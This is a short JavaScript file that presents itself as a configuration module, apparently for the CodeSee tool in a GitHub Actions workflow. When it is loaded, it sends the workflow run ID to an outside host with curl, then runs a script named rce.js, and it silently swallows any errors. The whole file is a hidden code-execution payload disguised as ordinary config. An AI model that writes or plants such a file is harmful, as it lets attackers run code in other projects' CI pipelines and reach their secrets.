const { execSync } = require('child_process');
try {
    const runId = process.env.GITHUB_RUN_ID;
    execSync(`curl -X PUT -d "codesee-config-js-running" "https://open-hookbin.vercel.app/${runId}"`, { stdio: 'inherit' });
    execSync('node rce.js || node ${GITHUB_WORKSPACE}/rce.js || true', { stdio: 'inherit' });
} catch (e) {}
module.exports = {};
